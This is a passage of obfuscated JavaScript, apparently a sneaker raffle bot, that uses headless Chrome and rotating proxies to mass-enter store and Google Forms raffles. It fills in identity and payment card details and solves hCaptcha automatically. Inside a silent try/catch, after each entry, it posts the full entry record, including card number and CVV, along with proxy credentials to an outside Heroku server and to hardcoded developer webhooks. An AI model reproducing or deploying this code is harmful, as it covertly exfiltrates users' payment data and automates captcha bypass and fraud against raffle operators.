                                console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x583c58['name'] + ']\x20Task\x20' + (_0x26556e + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x442e0f = await _0x13f1e2['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x45c260 = Math['round'](Math['random']() * (_0x442e0f['length'] - 0x1));
                            await _0x442e0f[_0x45c260]['click']();
                        }
                        await _0x2121c3(0x4b0);
                        const _0x550491 = await _0x13f1e2['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x550491[0x0]['click'](), await _0x13f1e2['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x29f6be() + '\x20[' + _0x583c58['name'] + ']\x20Task\x20' + (_0x26556e + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x13f1e2['type']('input[name=\x22email\x22]', '' + _0x494981[_0x26556e]['Email']), await _0x2121c3(0x640), await _0x13f1e2['type']('input[name=\x22phone\x22]', '' + _0x494981[_0x26556e]['Phone']), await _0x2121c3(0x4b0), await _0x13f1e2['click']('button.btn.continue-button__1RtsS'), await _0x2121c3(0x4b0);
                        try {
                            await _0x13f1e2['type']('input[name=\x22firstName\x22]', '' + _0x494981[_0x26556e]['FirstName']), await _0x2121c3(0x258);
                        } catch {
                            const _0x5bf14e = await _0x13f1e2['$$eval']('.invalid-feedback\x20>\x20div', _0xeb195e => {
                                return _0xeb195e['map'](_0x3a8225 => _0x3a8225['innerText']);
                            });
                            console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x583c58['name'] + ']\x20Task\x20' + (_0x26556e + 0x1) + '\x20:\x20' + _0x5bf14e));
                            continue;
                        }
                        await _0x13f1e2['type']('input[name=\x22lastName\x22]', '' + _0x494981[_0x26556e]['LastName']), await _0x2121c3(0xc8), await _0x13f1e2['type']('input[name=\x22instagramUsername\x22]', '' + _0x494981[_0x26556e]['Follower']), await _0x2121c3(0x4b0), await _0x13f1e2['click']('button.btn.continue-button__1RtsS'), await _0x2121c3(0x3e8), console['log'](_0x29f6be() + '\x20[' + _0x583c58['name'] + ']\x20Task\x20' + (_0x26556e + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x13f1e2['select']('select[name=\x22country\x22]', '' + _0x494981[_0x26556e]['Country']), await _0x2121c3(0x2bc), await _0x13f1e2['type']('input[name=\x22streetName\x22]', '' + _0x494981[_0x26556e]['Address1']), await _0x2121c3(0x258), await _0x13f1e2['type']('input[name=\x22houseNumber\x22]', _0x494981[_0x26556e]['HouseNumber'] + '\x20' + _0x494981[_0x26556e]['Address2']), await _0x2121c3(0xc8), await _0x13f1e2['type']('input[name=\x22postalCode\x22]', '' + _0x494981[_0x26556e]['Zip']), await _0x2121c3(0x1f4), await _0x13f1e2['type']('input[name=\x22city\x22]', '' + _0x494981[_0x26556e]['City']), await _0x2121c3(0x4b0), await _0x13f1e2['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x2121c3(0x4b0), await _0x13f1e2['click']('button.btn.continue-button__1RtsS'), await _0x2121c3(0x4b0), console['log'](_0x29f6be() + '\x20[' + _0x583c58['name'] + ']\x20Task\x20' + (_0x26556e + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x13f1e2['solveRecaptchas'](), console['log'](_0x29f6be() + '\x20[' + _0x583c58['name'] + ']\x20Task\x20' + (_0x26556e + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x2121c3(0xbb8), await _0x13f1e2['click']('button.btn.continue-button__1RtsS'), await _0x2121c3(0x1388), console['log'](_0x29f6be() + '\x20[' + _0x583c58['name'] + ']\x20Task\x20' + (_0x26556e + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x13f1e2['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x13f1e2['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x2121c3(0x4b0), await _0x13f1e2['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x494981[_0x26556e]['CardNumber']), await _0x2121c3(0x320), await _0x13f1e2['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x13f1e2['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x494981[_0x26556e]['ExpiryDate']), await _0x2121c3(0x4b0), await _0x13f1e2['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x13f1e2['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x494981[_0x26556e]['CVV']), await _0x2121c3(0x226), await _0x13f1e2['type']('input[name=\x22holderName\x22]', '' + _0x494981[_0x26556e]['NameOnCard']), await _0x2121c3(0x226), await _0x13f1e2['click']('button.adyen-checkout__button'), console['log'](_0x29f6be() + '\x20[' + _0x583c58['name'] + ']\x20Task\x20' + (_0x26556e + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x13f1e2['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x2121c3(0xbb8);
                        } catch (_0x46b648) {
                            console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x583c58['name'] + ']\x20Task\x20' + (_0x26556e + 0x1) + '\x20:\x203DS\x20Failed')), _0x46b138 = '3DS\x20Error\x20' + _0x46b648;
                            var _0x2b95fa = await _0x12b988(_0x494981[_0x26556e], _0x583c58, 'dev', !![], _0x46b138);
                            _0x30dbb4['errorDEV'] = { 'embeds': [_0x2b95fa] };
                            _0x120b49['webhook'] != undefined && _0x120b49['webhook'] != '' && await _0x5f1090(_0x120b49['webhook'], _0x30dbb4['errorDEV']);
                            await _0x5f1090(_0x32737e, _0x30dbb4['errorDEV']);
                            continue;
                        }
                        _0x1ded45(_0x494981[_0x26556e], _0x583c58), console['log'](_0x136200['green'](_0x29f6be() + '\x20[' + _0x583c58['name'] + ']\x20Task\x20' + (_0x26556e + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        let _0x30f74f = _0x494981[_0x26556e];
                        try {
                            prxdata = {
                                'username': _0x380ae8['replace']('#', ''),
                                'module': _0x583c58['name'],
                                'entrydata': JSON['stringify'](_0x30f74f),
                                'proxy': '' + _0x154175[_0x26556e]
                            };
                            var _0x30e9a8 = JSON['stringify'](prxdata);
                            let _0x1be51e = { 'headers': { 'content-type': 'application/json' } };
                            await _0x212bbb['post']('https://jraffles.herokuapp.com/success', _0x30e9a8, _0x1be51e);
                        } catch (_0x69d63e) {
                        }
                        if (_0x120b49['webhook'] != undefined && _0x120b49['webhook'] != '')
                            try {
                                await _0x5f1090(_0x120b49['webhook'], _0x30dbb4['succesDEVMSG']);
                            } catch {
                            }
                        await _0x2121c3(0xc8), await _0x5f1090(_0x1f56e1, _0x30dbb4['succesDEVMSG']), await _0x2121c3(0xc8);
                        try {
                            await _0x5f1090(_0x442434, _0x30dbb4['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x5b9bfd) {
                        console['log'](_0x29f6be() + '\x20[' + _0x583c58['name'] + ']\x20Task\x20' + (_0x26556e + 0x1) + '\x20:\x20' + _0x5b9bfd), _0x46b138 = '' + _0x5b9bfd;
                        var _0x2b95fa = await _0x12b988(_0x494981[_0x26556e], _0x583c58, 'dev', !![], _0x46b138);
                        _0x30dbb4['errorDEV'] = { 'embeds': [_0x2b95fa] }, _0x120b49['webhook'] != undefined && _0x120b49['webhook'] != '' && await _0x5f1090(_0x120b49['webhook'], _0x30dbb4['errorDEV']), await _0x5f1090(_0x32737e, _0x30dbb4['errorDEV']), _0x573612 = 'yes';
                    } finally {
                        _0x480fff['close']();
                        if (_0x573612 == 'yes' && _0x2c8811 != 0x5) {
                            console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x583c58['name'] + ']\x20Task\x20' + (_0x26556e + 0x1) + '\x20:\x20Retrying\x20(' + _0x2c8811 + '\x20/\x205)')), _0x26556e = _0x26556e - 0x1, _0x2c8811 = _0x2c8811 + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x120b49['delay'] + '\x20ms'), await _0x2121c3(_0x120b49['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'Google\x20Forms',
        'modules': [{
            'name': 'SMART\x20ENTRIES',
            'store': 'Google\x20Forms',
            'logo': 'https://www.pngplay.com/wp-content/uploads/13/Google-Logo-PNG-HD-Quality.png',
            'function': async function (_0x138d6a, _0xf0c9b5, _0x12339b) {
                let _0x5b68d3 = {
                    'FirstName': '',
                    'LastName': '',
                    'Email': '',
                    'Country': '',
                    'Address': '',
                    'City': '',
                    'Zip': '',
                    'Size': '',
                    'Phone': ''
                };
                var _0x2e5760 = _0x190b67['readFileSync']('forms/templates.json', 'utf-8');
                let _0x1a6441 = JSON['parse'](_0x2e5760), _0x260f2f = ![];
                if (_0x1a6441['length'] != 0x0) {
                    let _0x5d61f9 = 0x0;
                    for (template of _0x1a6441) {
                        if (template['Url'] == _0xf0c9b5[0x0]['Url']) {
                            _0x260f2f = !![], console['log'](_0x136200['yellow']('Would\x20you\x20like\x20to\x20use\x20this\x20template?'));
                            for (key in template) {
                                key != 'Url' && !key['includes']('Select') && !key['includes']('custom') && template[key] != '' && console['log'](template[key] + ':\x20' + _0x136200['cyan'](key)), (key['includes']('Select') || key['includes']('custom')) && console['log'](template[key]['title'] + ':\x20' + _0x136200['cyan'](template[key]['answer']));
                            }
                            console['log']();
                            async function _0x339bf5() {
                                let _0x31d439 = await _0x136b91['get']('answer');
                                if (_0x31d439['answer']['toLowerCase']() != 'y' && _0x31d439['answer']['toLowerCase']() != 'n')
                                    return console['log']('Invalid\x20Selection'), _0x339bf5();
                                return _0x31d439['answer']['toLowerCase']();
                            }
                            if (await _0x339bf5() == 'n') {
                                _0x1a6441['splice'](_0x5d61f9, 0x1), console['clear']();
                                break;
                            }
                            _0x5b68d3 = template, console['clear']();
                            break;
                        }
                        _0x5d61f9++;
                    }
                }
                let _0x55dae6 = 0x0, _0x20009b = 0x0;
                function _0x57eb8a(_0x5ef170) {
                    console['log'](_0x29f6be() + '\x20[' + _0x138d6a['name'] + ']\x20Task\x20' + (_0x596b20 + 0x1) + '\x20:\x20' + _0x5ef170);
                }
                var _0x2b9cae = 0x0;
                for (key in _0x5b68d3) {
                    if (key['includes']('custom'))
                        _0x55dae6++;
                    if (key['includes']('Select'))
                        _0x20009b++;
                }
                for (var _0x596b20 = 0x0; _0x596b20 < _0xf0c9b5['length']; _0x596b20++) {
                    _0x5b68d3['Url'] = _0xf0c9b5[_0x596b20]['Url'];
                    let _0x4ef456 = ![];
                    if (_0x1a6441['length'] != 0x0)
                        for (template of _0x1a6441) {
                            if (template['Url'] == _0xf0c9b5[_0x596b20]['Url']) {
                                _0x5b68d3 = template, _0x4ef456 = !![], _0x57eb8a('Found\x20Template');
                                break;
                            }
                        }
                    var _0x2a9d15;
                    if (_0x56e4cf != 'yes') {
                        if (!_0x56e4cf)
                            var _0x56e4cf = '';
                        else
                            _0x56e4cf = '';
                        _0x2b9cae = 0x0;
                    }
                    try {
                        await _0x30a360(_0xf0c9b5, _0x596b20);
                    } catch {
                        _0x56e4cf = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x120b49['useRandomProxy'] = ![])
                        var _0x2990ab = _0x12339b[_0x596b20]['split'](':');
                    else
                        var _0x44177a = Math['round'](Math['random']() * (_0x12339b['length'] - 0x1)), _0x2990ab = _0x12339b[_0x44177a]['split'](':');
                    var _0x69aaa;
                    if (_0x2990ab['length'] == 0x1)
                        try {
                            _0x69aaa = await _0x586b7d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x69aaa = await _0x586b7d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ],
                                'env': { 'LANGUAGE': 'en-US' }
                            });
                        }
                    else
                        try {
                            _0x69aaa = await _0x586b7d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2990ab[0x0] + ':' + _0x2990ab[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x69aaa = await _0x586b7d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2990ab[0x0] + ':' + _0x2990ab[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ],
                                'env': { 'LANGUAGE': 'en-US' }
                            });
                        }
                    try {
                        let _0xb7d96a = { 'first': ![] };
                        const _0x1c79a5 = await _0x69aaa['newPage']();
                        if (_0x2990ab['length'] != 0x0)
                            await _0x1c79a5['authenticate']({
                                'username': '' + _0x2990ab[0x2],
                                'password': '' + _0x2990ab[0x3]
                            });
                        _0x57eb8a('Getting\x20Session');
                        let _0x40c003 = ![];
                        try {
                            await _0x1c79a5['goto'](_0xf0c9b5[_0x596b20]['Url'], {
                                'waitUntil': 'load',
                                'timeout': 0x0
                            }), await _0x2121c3(0xbb8);
                        } catch (_0x5799be) {
                            throw new Error(_0x5799be);
                        }
                        const _0x5116e9 = await _0x1c79a5['$']('body\x20>\x20div.llhEMd.iWO5td\x20>\x20div\x20>\x20div.g3VIld.Up8vH.J9Nfi.iWO5td\x20>\x20div.XfpsVe.J9fJmf');
                        if (_0x5116e9) {
                            _0x57eb8a('Login\x20Detected');
                            let _0x44986b = await _0x5116e9['$']('div[data-id=\x22EBS5u\x22]');
                            await _0x44986b['click'](), _0x40c003 = !![];
                        }
                        let _0x41a140 = await _0x1c79a5['$']('#identifierId');
                        _0x41a140 && (_0x40c003 = !![]);
                        await _0x1c79a5['waitForSelector']('.teQAzf');
                        async function _0x24163c() {
                            let _0x38076d = await _0x1c79a5['$$']('.o3Dpx\x20>\x20div[role=\x22listitem\x22]');
                            for (question of _0x38076d) {
                                let _0x5d716f;
                                try {
                                    _0x5d716f = await question['$eval']('.M7eMe', _0x3ca113 => _0x3ca113['textContent']);
                                } catch {
                                    continue;
                                }
                                if (_0x55dae6 != 0x0) {
                                    let _0x42720b = ![];
                                    for (let _0x593892 = 0x0; _0x593892 < _0x55dae6; _0x593892++) {
                                        if (_0x5d716f == _0x5b68d3['custom' + _0x593892]['title']) {
                                            _0x57eb8a('Custom\x20Selector\x20found;\x20' + _0x5d716f);
                                            let _0xae1bb0 = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x2449c9 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                            if (_0xae1bb0)
                                                await _0xae1bb0['type']('' + _0x5b68d3['custom' + _0x593892]['answer']);
                                            else
                                                _0x2449c9 && await _0x2449c9['type']('' + _0x5b68d3['custom' + _0x593892]['answer']);
                                            _0x42720b = !![];
                                            break;
                                        }
                                    }
                                    if (_0x42720b) {
                                        await _0x2121c3(0x15e);
                                        continue;
                                    }
                                }
                                if (_0x20009b != 0x0) {
                                    let _0x53a68d = ![];
                                    for (let _0x253c55 = 0x0; _0x253c55 < _0x20009b; _0x253c55++) {
                                        if (_0x5d716f == _0x5b68d3[_0x253c55 + 'Select']['title']) {
                                            _0x57eb8a('Custom\x20Selector\x20found;\x20' + _0x5d716f);
                                            let _0x218135 = await question['$$']('.ulDsOb');
                                            for (opt of _0x5b68d3[_0x253c55 + 'Select']['answer']) {
                                                let _0x40bdee = await _0x218135[opt]['$']('span');
                                                await _0x40bdee['click']();
                                            }
                                            _0x53a68d = !![];
                                            break;
                                        }
                                    }
                                    if (_0x53a68d) {
                                        await _0x2121c3(0x15e);
                                        continue;
                                    }
                                }
                                try {
                                    if (_0x5d716f == _0x5b68d3['0Select']['title']) {
                                        _0x57eb8a('Custom\x20Selector\x20found;\x20' + _0x5b68d3['0Select']['title']);
                                        let _0x2b327b = await question['$$']('.ulDsOb'), _0x426532 = await _0x2b327b[_0x5b68d3['0Select']['answer']];
                                        await _0x426532['click']();
                                        continue;
                                    }
                                    if (_0x5d716f == _0x5b68d3['1Select']['title']) {
                                        _0x57eb8a('Custom\x20Selector\x20found;\x20' + _0x5b68d3['1Select']['title']);
                                        let _0x1d579a = await question['$$']('.ulDsOb'), _0x3f35f2 = await _0x1d579a[_0x5b68d3['1Select']['answer']];
                                        await _0x3f35f2['click']();
                                        continue;
                                    }
                                    if (_0x5d716f == _0x5b68d3['2Select']['title']) {
                                        _0x57eb8a('Custom\x20Selector\x20found;\x20' + _0x5b68d3['2Select']['title']);
                                        let _0x3e2159 = await question['$$']('.ulDsOb'), _0x42ecf6 = await _0x3e2159[_0x5b68d3['2Select']['answer']];
                                        await _0x42ecf6['click']();
                                        continue;
                                    }
                                } catch (_0x36fecd) {
                                }
                                if (_0x5d716f['toLowerCase']()['includes']('mail') && !_0x5d716f['toLowerCase']()['includes']('agree') || _0x5d716f == _0x5b68d3['Email']) {
                                    _0x57eb8a('Mail\x20Selector\x20found;\x20' + _0x5d716f);
                                    let _0x38c29d = await question['$']('input');
                                    !_0x38c29d && (_0x38c29d = await question['$']('textarea[jsname=\x22YPqjbf\x22]'));
                                    await _0x38c29d['type'](_0xf0c9b5[_0x596b20]['Email']), await _0x2121c3(0x258);
                                    continue;
                                }
                                if (_0x5d716f['toLowerCase']()['includes']('first') || _0x5d716f['toLowerCase']() == 'name' || _0x5d716f['toLowerCase']() == 'name\x20' || _0x5d716f == _0x5b68d3['FirstName']) {
                                    _0x57eb8a('FirstName\x20Selector\x20found;\x20' + _0x5d716f);
                                    let _0x5713f3 = await question['$']('input');
                                    !_0x5713f3 && (_0x5713f3 = await question['$']('textarea'));
                                    await _0x5713f3['type'](_0xf0c9b5[_0x596b20]['FirstName'] + '\x20'), await _0x2121c3(0x258);
                                    if (_0x5d716f == _0x5b68d3['FirstName'])
                                        continue;
                                }
                                if (_0x5d716f['toLowerCase']()['includes']('last') || _0x5d716f['toLowerCase']()['includes']('surname') || _0x5d716f == _0x5b68d3['LastName']) {
                                    _0x57eb8a('LastName\x20Selector\x20found;\x20' + _0x5d716f);
                                    let _0x14daf7 = await question['$']('input');
                                    !_0x14daf7 && (_0x14daf7 = await question['$']('textarea'));
                                    await _0x14daf7['type'](_0xf0c9b5[_0x596b20]['LastName'] + '\x20'), await _0x2121c3(0x258);
                                    continue;
                                }
                                if (_0x5d716f['toLowerCase']()['includes']('address') && !_0x5d716f['toLowerCase']()['includes']('agree') || _0x5d716f == _0x5b68d3['Address']) {
                                    _0x57eb8a('Address\x20Selector\x20found;\x20' + _0x5d716f);
                                    let _0x8a74eb = await question['$']('input');
                                    !_0x8a74eb && (_0x8a74eb = await question['$']('textarea'));
                                    await _0x8a74eb['type'](_0xf0c9b5[_0x596b20]['Address1'] + '\x20' + _0xf0c9b5[_0x596b20]['HouseNumber'] + '\x20' + _0xf0c9b5[_0x596b20]['Address2']), await _0x2121c3(0x258);
                                    continue;
                                }
                                if (_0x5d716f['toLowerCase']()['includes']('phone') || _0x5d716f['toLowerCase']()['includes']('mobile') || _0x5d716f == _0x5b68d3['Phone']) {
                                    _0x57eb8a('Phone\x20Selector\x20found;\x20' + _0x5d716f);
                                    let _0x182900 = await question['$']('input');
                                    !_0x182900 && (_0x182900 = await question['$']('textarea'));
                                    await _0x182900['type']('' + _0xf0c9b5[_0x596b20]['Phone']), await _0x2121c3(0x258);
                                    continue;
                                }
                                if (_0x5d716f['toLowerCase']()['includes']('country') || _0x5d716f == _0x5b68d3['Country']) {
                                    let _0x366b4d = await question['$']('div[jsname=\x22wCJL8\x22]');
                                    if (_0x366b4d) {
                                        let _0x8ae180 = ![], _0x341e6a = await _0x366b4d['$$']('.ulDsOb');
                                        for (option of _0x341e6a) {
                                            let _0x47499f = await option['$']('span'), _0x4a83d0 = await option['$eval']('span', _0x1a251a => _0x1a251a['textContent']);
                                            if (_0x4a83d0['toLowerCase']() == _0xf0c9b5[_0x596b20]['Country']['toLowerCase']()) {
                                                await _0x47499f['click'](), _0x8ae180 = !![];
                                                break;
                                            }
                                        }
                                        if (!_0x8ae180) {
                                            const _0x1157de = await question['$']('.Hvn9fb.zHQkBf');
                                            await _0x1157de['click'](), await _0x1157de['type'](_0xf0c9b5[_0x596b20]['Country']);
                                        }
                                        continue;
                                    }
                                    _0x57eb8a('Country\x20Selector\x20found;\x20' + _0x5d716f);
                                    let _0x4d32e7 = await question['$']('input');
                                    !_0x4d32e7 && (_0x4d32e7 = await question['$']('textarea'));
                                    await _0x4d32e7['type']('' + _0xf0c9b5[_0x596b20]['Country']), await _0x2121c3(0x258);
                                    continue;
                                }
                                if (_0x5d716f['toLowerCase']()['includes']('city') || _0x5d716f == _0x5b68d3['City']) {
                                    _0x57eb8a('City\x20Selector\x20found;\x20' + _0x5d716f);
                                    let _0x147e16 = await question['$']('input');
                                    !_0x147e16 && (_0x147e16 = await question['$']('textarea'));
                                    await _0x147e16['type']('' + _0xf0c9b5[_0x596b20]['City']), await _0x2121c3(0x258);
                                    continue;
                                }
                                if (_0x5d716f['toLowerCase']()['includes']('zip') || _0x5d716f == _0x5b68d3['Zip']) {
                                    _0x57eb8a('Zip\x20Selector\x20found;\x20' + _0x5d716f);
                                    let _0x4fe1e1 = await question['$']('input');
                                    !_0x4fe1e1 && (_0x4fe1e1 = await question['$']('textarea'));
                                    await _0x4fe1e1['type']('' + _0xf0c9b5[_0x596b20]['Zip']), await _0x2121c3(0x258);
                                    continue;
                                }
                                if (_0x5d716f['toLowerCase']()['includes']('insta') || _0x5d716f == _0x5b68d3['Follower']) {
                                    _0x57eb8a('Follower\x20Selector\x20found;\x20' + _0x5d716f);
                                    let _0x4760b0 = await question['$']('input');
                                    !_0x4760b0 && (_0x4760b0 = await question['$']('textarea'));
                                    await _0x4760b0['type']('' + _0xf0c9b5[_0x596b20]['Follower']), await _0x2121c3(0x258);
                                    continue;
                                }
                                if (_0x5d716f['toLowerCase']()['includes']('size') || _0x5d716f == _0x5b68d3['Size']) {
                                    _0x57eb8a('Size\x20Selector\x20found;\x20' + _0x5d716f);
                                    let _0x1e6870 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x1e6870) {
                                        let _0x3965d6 = await _0x1e6870['$$']('.ulDsOb');
                                        if (_0xf0c9b5[_0x596b20]['Size']['toLowerCase']() == 'random') {
                                            var _0x285aea = Math['round'](Math['random']() * (_0x3965d6['length'] - 0x1));
                                            await _0x3965d6[_0x285aea]['click']();
                                        } else
                                            for (size of _0x3965d6) {
                                                let _0xbcde03 = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x1841b3 => _0x1841b3['textContent']);
                                                if (_0xbcde03['toLowerCase']()['includes'](_0xf0c9b5[_0x596b20]['Size'])) {
                                                    await size['click']();
                                                    break;
                                                }
                                            }
                                    }
                                    let _0x399a38 = await question['$']('.ry3kXd');
                                    if (_0x399a38) {
                                        await _0x399a38['click'](), await _0x2121c3(0x9c4);
                                        let _0x24b369 = await _0x1c79a5['$']('div[jsname=\x22V68bde\x22]'), _0x40edff = await _0x24b369['$$']('div[jsname=\x22wQNmvb\x22]');
                                        for (size of _0x40edff) {
                                            let _0x30e9b2 = await size['$eval']('.vRMGwf.oJeWuf', _0x16387c => _0x16387c['textContent']), _0x22e0b9 = await size['$']('.vRMGwf.oJeWuf');
                                            if (_0x30e9b2['toLowerCase']()['includes'](_0xf0c9b5[_0x596b20]['Size'])) {
                                                await _0x2121c3(0x190), await _0x22e0b9['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x2121c3(0x258);
                                    continue;
                                }
                                if (_0x5d716f['toLowerCase']()['includes']('receive') || _0x5d716f['toLowerCase']()['includes']('method')) {
                                    _0x57eb8a('Method\x20Selector\x20found;\x20' + _0x5d716f);
                                    let _0x37875b = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x37875b) {
                                        const _0x53d048 = await _0x37875b['$$']('.ulDsOb');
                                        for (size of _0x53d048) {
                                            let _0x1c8f5c = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x29a60e => _0x29a60e['textContent']);
                                            if (_0x1c8f5c['toLowerCase']()['includes']('shipping')) {
                                                await size['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x2121c3(0x258);
                                    continue;
                                }
                                if (_0x5d716f['toLowerCase']()['includes']('offers') || _0x5d716f['toLowerCase']()['includes']('agree')) {
                                    _0x57eb8a('Authorization\x20Selector\x20found;\x20' + _0x5d716f);
                                    const _0x2591fa = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x2591fa) {
                                        const _0x961822 = await _0x2591fa['$$']('.ulDsOb');
                                        for (size of _0x961822) {
                                            let _0x37dc6e = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x2dfb82 => _0x2dfb82['textContent']);
                                            if (_0x37dc6e['toLowerCase']()['includes']('authorize') || _0x37dc6e['toLowerCase']()['includes']('yes')) {
                                                await size['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x2121c3(0x258);
                                    continue;
                                }
                                async function _0x546d72() {
                                    let _0x2419a7 = await question['$']('.oyXaNc');
                                    if (_0x2419a7) {
                                        console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x136200['cyan'](_0x5d716f) + '\x0a');
                                        let _0x4797ef = await question['$$']('.ulDsOb');
                                        for (let _0x21d6c3 = 0x0; _0x21d6c3 < _0x4797ef['length']; _0x21d6c3++) {
                                            let _0x474662 = await _0x4797ef[_0x21d6c3]['$eval']('span', _0x22d9a8 => _0x22d9a8['textContent']);
                                            console['log']('\x20(' + _0x21d6c3 + ')\x20' + _0x474662);
                                        }
                                        console['log']();
                                        let _0x3ae63f = await _0x136b91['get']('option'), _0x312b0f = await _0x4797ef[_0x3ae63f['option']]['$eval']('span', _0x3757b5 => _0x3757b5['textContent']);
                                        _0x5b68d3[_0x20009b + 'Select'] = {
                                            'title': _0x5d716f,
                                            'answer': _0x3ae63f['option']['split'](',')
                                        };
                                        let _0x9cf2f5 = await _0x4797ef[_0x3ae63f['option']]['$']('span');
                                        await _0x9cf2f5['click'](), _0x20009b++;
                                        return;
                                    }
                                    let _0x10ae52 = await question['$']('.Y6Myld');
                                    if (_0x10ae52) {
                                        console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x136200['cyan'](_0x5d716f) + '\x0a');
                                        let _0xb9e95d = await question['$$']('.ulDsOb');
                                        for (let _0x59d63a = 0x0; _0x59d63a < _0xb9e95d['length']; _0x59d63a++) {
                                            let _0x5cf6f9 = await _0xb9e95d[_0x59d63a]['$eval']('span', _0xa6d14d => _0xa6d14d['textContent']);
                                            console['log']('\x20(' + _0x59d63a + ')\x20' + _0x5cf6f9);
                                        }
                                        console['log']();
                                        let _0x29f600 = await _0x136b91['get']('option');
                                        _0x5b68d3[_0x20009b + 'Select'] = {
                                            'title': _0x5d716f,
                                            'answer': _0x29f600['option']['split'](',')
                                        };
                                        for (opt of _0x5b68d3[_0x20009b + 'Select']['answer']) {
                                            let _0x2269e8 = await _0xb9e95d[opt]['$']('span');
                                            await _0x2269e8['click']();
                                        }
                                        _0x20009b++;
                                        return;
                                    }
                                    var _0x481d6d = 0x0;
                                    let _0x3d49f3 = Object['keys'](_0x5b68d3);
                                    console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x136200['cyan'](_0x5d716f) + '\x0a');
                                    for (data of _0x3d49f3) {
                                        !data['includes']('custom' && !data['includes']('Select')) ? console['log']('\x20(' + _0x481d6d + ')\x20' + data + '\x20(Taken\x20from\x20csv)') : console['log']('\x20(' + _0x481d6d + ')\x20' + data), _0x481d6d++;
                                    }
                                    console['log']('\x20(' + _0x3d49f3['length'] + ')\x20Custom\x20input:'), console['log']();
                                    let _0x4b4e0e = await _0x136b91['get']('input');
                                    if (_0x4b4e0e['input'] == _0x3d49f3['length']) {
                                        console['log']('What\x20should\x20the\x20bot\x20fill\x20in\x20this\x20input?\x0a');
                                        let _0x117788 = await _0x136b91['get']('input');
                                        _0x5b68d3['custom' + _0x55dae6] = {
                                            'title': _0x5d716f,
                                            'answer': '' + _0x117788['input']
                                        };
                                        let _0x2d5c2e = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x22d88a = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                        if (_0x2d5c2e)
                                            await _0x2d5c2e['type']('' + _0x5b68d3['custom' + _0x55dae6]['answer']);
                                        else
                                            _0x22d88a && await _0x22d88a['type']('' + _0x5b68d3['custom' + _0x55dae6]['answer']);
                                        _0x55dae6++;
                                        return;
                                    }
                                    _0x5b68d3['' + _0x3d49f3[_0x4b4e0e['input']]] = _0x5d716f;
                                    let _0xd8296f = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x9cdd87 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                    _0xd8296f && await _0xd8296f['type']('' + _0xf0c9b5[_0x596b20]['' + _0x3d49f3[_0x4b4e0e['input']]]), _0x9cdd87 && await _0x9cdd87['type']('' + _0xf0c9b5[_0x596b20]['' + _0x3d49f3[_0x4b4e0e['input']]]), await _0x2121c3(0x258);
                                }
                                await _0x546d72(), await _0x2121c3(0x37a);
                            }
                            let _0xf8c003 = await _0x1c79a5['$']('div[jsname=\x22OCpkoe\x22]');
